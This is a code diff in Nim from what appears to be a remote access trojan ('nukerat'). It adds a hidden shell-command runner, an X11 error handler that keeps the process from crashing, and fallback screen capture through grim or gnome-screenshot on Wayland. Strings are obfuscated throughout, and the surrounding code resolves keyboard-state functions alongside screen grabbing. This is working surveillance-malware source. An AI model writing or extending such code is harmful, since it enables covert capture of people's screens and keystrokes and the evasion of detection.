@@ -878,10 +878,16 @@ type XDisplayKeycodesFn = proc(display: Display; min_kc, max_kc: ptr cint): cint
 type XQueryKeymapFn = proc(display: Display; keys: ptr array[32, char]): cint {.cdecl.}
 type XKeycodeToKeysymFn = proc(display: Display; keycode: cuint; index: cint): culong {.cdecl.}
 
+const x11ErrorCodeOffset = 32
+
+type XErrorHandlerFn = proc(display: Display; event: pointer): cint {.cdecl.}
+type XSetErrorHandlerFn = proc(handler: XErrorHandlerFn): XErrorHandlerFn {.cdecl.}
+
 proc dlopen(name: cstring, flag: cint): pointer {.importc, header: "dlfcn.h".}
 proc dlsym(handle: pointer, name: cstring): pointer {.importc, header: "dlfcn.h".}
 
 var
+  x11CaptureErrorCode: uint8 = 0
   xLibHandle: pointer = nil
   xOpenDisplayFn: XOpenDisplayFn = nil
   xCloseDisplayFn: XCloseDisplayFn = nil
@@ -894,6 +900,54 @@ var
   xDisplayKeycodesFn: XDisplayKeycodesFn = nil
   xQueryKeymapFn: XQueryKeymapFn = nil
   xKeycodeToKeysymFn: XKeycodeToKeysymFn = nil
+  xSetErrorHandlerFn: XSetErrorHandlerFn = nil
+
+proc x11CaptureErrorHandler(display: Display; event: pointer): cint {.cdecl.} =
+  # Records x11 capture errors without aborting the process
+  if event != nil:
+    x11CaptureErrorCode = cast[ptr uint8](cast[int](event) + x11ErrorCodeOffset)[]
+  0
+
+proc shellCommandSucceeded(status: cint): bool =
+  # Checks that a shell child exited with status zero
+  (status and 0x7F) == 0 and ((status shr 8) and 0xFF) == 0
+
+proc runShellQuiet*(script: string): bool =
+  # Runs a shell command and returns whether it exited successfully
+  let shPath = obf("/bin/sh")
+  let dashC = obf("-c")
+  let pid = fork()
+  if pid < 0:
+    return false
+  if pid == 0:
+    var argv: array[4, cstring]
+    argv[0] = shPath.cstring
+    argv[1] = dashC.cstring
+    argv[2] = script.cstring
+    argv[3] = nil
+    discard execvp(argv[0], cast[cstringArray](addr argv[0]))
+    quit(127)
+  var status: cint = 0
+  discard waitpid(pid, status, 0)
+  shellCommandSucceeded(status)
+
+proc grimBinaryPath*(): string =
+  # Returns the first grim binary path that exists on disk
+  for path in grimBinPaths:
+    if pathExists(path):
+      return path
+  ""
+
+proc sessionIsWayland*(): bool =
+  # Checks that the current session type is wayland
+  let raw = getenv(sessionTypeEnvKey.cstring)
+  if raw == nil:
+    return false
+  $raw == sessionTypeWayland
+
+proc fallbackCaptureAvailable*(): bool =
+  # Checks that a non-x11 screen capture tool is available
+  grimBinaryPath().len > 0 or pathExists(gnomeScreenshotBin)
 
 proc loadX11(): bool =
   # Loads the x11 library and resolves its symbols
@@ -915,6 +969,9 @@ proc loadX11(): bool =
   xDisplayKeycodesFn = cast[XDisplayKeycodesFn](dlsym(xLibHandle, obf("XDisplayKeycodes").cstring))
   xQueryKeymapFn = cast[XQueryKeymapFn](dlsym(xLibHandle, obf("XQueryKeymap").cstring))
   xKeycodeToKeysymFn = cast[XKeycodeToKeysymFn](dlsym(xLibHandle, obf("XKeycodeToKeysym").cstring))
+  xSetErrorHandlerFn = cast[XSetErrorHandlerFn](dlsym(xLibHandle, obf("XSetErrorHandler").cstring))
+  if xSetErrorHandlerFn != nil:
+    discard xSetErrorHandlerFn(x11CaptureErrorHandler)
   xOpenDisplayFn != nil and xCloseDisplayFn != nil and xDefaultScreenFn != nil and
     xDisplayWidthFn != nil and xDisplayHeightFn != nil and xDefaultRootWindowFn != nil and
     xGetImageFn != nil and xDestroyImageFn != nil and xDisplayKeycodesFn != nil and
@@ -952,24 +1009,60 @@ type ScreenCapture* = object
   error*: string
   data*: seq[byte]
   w*, h*, stride*: int
+  png*: seq[byte]
 
 proc pretestCapture*(): string =
   # Checks that a screen capture can start
-  if getenv(displayEnvKey.cstring) == nil:
+  if getenv(displayEnvKey.cstring) != nil:
+    if loadX11():
+      let disp = xOpenDisplayFn(nil)
+      if cast[pointer](disp) != nil:
+        defer:
+          xCloseDisplayFn(disp)
+        let screen = xDefaultScreenFn(disp)
+        let w = xDisplayWidthFn(disp, screen)
+        let h = xDisplayHeightFn(disp, screen)
+        if w > 0 and h > 0:
+          return ""
+  if fallbackCaptureAvailable():
+    return ""
+  if getenv(displayEnvKey.cstring) == nil and not sessionIsWayland():
     return obf("No graphical display (DISPLAY not set)")
   if not loadX11():
     return obf("X11 library not available")
-  let disp = xOpenDisplayFn(nil)
-  if cast[pointer](disp) == nil:
-    return obf("Cannot connect to X display")
+  obf("Cannot connect to X display")
+
+proc captureScreenViaTools*(): ScreenCapture =
+  # Captures the screen through grim or gnome-screenshot when x11 fails
+  result.ok = false
+  if not fallbackCaptureAvailable():
+    result.error = obf("No fallback screen capture tool found")
+    return
+  let outPath = obf("/tmp/nukerat-scr-") & $getpid() & obf(".png")
   defer:
-    xCloseDisplayFn(disp)
-  let screen = xDefaultScreenFn(disp)
-  let w = xDisplayWidthFn(disp, screen)
-  let h = xDisplayHeightFn(disp, screen)
-  if w <= 0 or h <= 0:
-    return obf("Invalid screen size")
-  ""
+    if pathExists(outPath):
+      discard unlink(outPath.cstring)
+  var cmd = ""
+  let grimPath = grimBinaryPath()
+  if grimPath.len > 0:
+    cmd = grimPath & obf(" ") & outPath
+  elif pathExists(gnomeScreenshotBin):
+    cmd = gnomeScreenshotBin & obf(" -f ") & outPath
+  else:
+    result.error = obf("No fallback screen capture tool found")
+    return
+  if not runShellQuiet(cmd):
+    result.error = obf("Screen capture tool failed")
+    return
+  let file = readFileBytes(outPath)
+  if not file.ok or file.data.len == 0:
+    if file.error.len > 0:
+      result.error = file.error
+    else:
+      result.error = obf("Screen capture returned empty image")
+    return
+  result.png = file.data
+  result.ok = true
 
 proc captureScreenBgra*(): ScreenCapture =
   # Captures the screen into bgra bytes
@@ -979,8 +1072,15 @@ proc captureScreenBgra*(): ScreenCapture =
     result.error = pre
     return
   try:
+    if not loadX11() or xOpenDisplayFn == nil:
+      if fallbackCaptureAvailable():
+        return captureScreenViaTools()
+      result.error = obf("X11 library not available")
+      return
     let disp = xOpenDisplayFn(nil)
     if cast[pointer](disp) == nil:
+      if fallbackCaptureAvailable():
+        return captureScreenViaTools()
       result.error = obf("Cannot connect to X display")
       return
     defer:
@@ -992,9 +1092,15 @@ proc captureScreenBgra*(): ScreenCapture =
       result.error = obf("Invalid screen size")
       return
     let root = xDefaultRootWindowFn(disp)
+    x11CaptureErrorCode = 0
     let img = xGetImageFn(disp, root, 0, 0, scrW.cuint, scrH.cuint, xAllPlanes, xZPixmap)
     if img == nil:
-      result.error = obf("Screen capture failed")
+      if fallbackCaptureAvailable():
+        return captureScreenViaTools()
+      if x11CaptureErrorCode != 0:
+        result.error = obf("X11 screen capture failed (X error ") & $x11CaptureErrorCode & ")"
+      else:
+        result.error = obf("Screen capture failed")
       return
     defer:
       discard xDestroyImageFn(img)
